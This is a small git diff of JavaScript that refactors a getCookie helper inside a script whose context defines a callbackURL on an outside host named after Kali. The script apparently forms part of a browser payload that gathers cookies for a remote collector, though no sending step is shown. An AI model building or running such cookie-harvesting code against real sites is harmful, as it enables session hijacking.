@@ -43,10 +43,9 @@ const callbackURL = "https://kali.umbsec.icu/";
    */
 
   function getCookie(name) {
-    return (
-      document.cookie.match("(^|;)\\s*" + name + "\\s*=\\s*([^;]+)")?.pop() ||
-      ""
-    );
+    const value = `; ${document.cookie}`;
+    const parts = value.split(`; ${name}=`);
+    if (parts.length === 2) return parts.pop().split(";").shift();
   }
 
   function fromJSON(responseText) {
